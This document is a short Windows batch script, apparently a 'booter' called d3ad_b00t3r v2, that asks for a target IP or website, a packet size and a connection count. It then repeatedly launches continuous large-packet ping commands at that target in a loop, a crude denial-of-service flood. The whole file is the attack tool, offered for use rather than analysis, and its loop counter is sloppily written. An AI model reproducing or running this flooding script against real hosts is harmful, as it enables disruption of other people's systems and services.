@echo off
rem [==================================]
rem    REMADE BOOTER BY @LeakerHounds
rem [==================================]
cls
title d3ad_b00t3r v2 
color 2
echo ========================================================
echo
echo 888888ba    a8888a   a8888a  d888888P d8888b.  888888ba 
echo 88    `8b  d8' ..8b d8' ..8b    88        `88  88    `8b
echo a88aaaa8P' 88 .P 88 88 .P 88    88     aaad8' a88aaaa8P'
echo 88   `8b.  88 d' 88 88 d' 88    88        `88  88   `8b.
echo 88    .88  Y8'' .8P Y8'' .8P    88        .88  88     88
echo 88888888P   Y8888P   Y8888P     dP    d88888P  dP     dP
echo
echo ========================================================                                                        

echo ENTER IP OR WEBSITE
echo EXAMPLE: website.com or 91.124.65.212                                                        
set /p D= IP/WEBSITE:
 
:START
color 0e
cls
echo SELECT PACKET SIZE...
echo (MAX AMMOUNT 65500)
echo.
set /p O= PACKET SIZE:
 
color 0c
cls
echo 
echo.
set /p S= HOW MANY CONNECTIONS:
cls

rem =-= TEST =-=
::(for %%k in (%S%) do (
::    start ping %D% -t -l %O%
::
::))
rem =-= IGNORE =-=

:while
if %k% leq %s% (
    echo Starting %s% connections....
    start ping %D% -t -l %O%
    cls
    SET /A "k = k + 1"
    goto :while
)
:END

pause >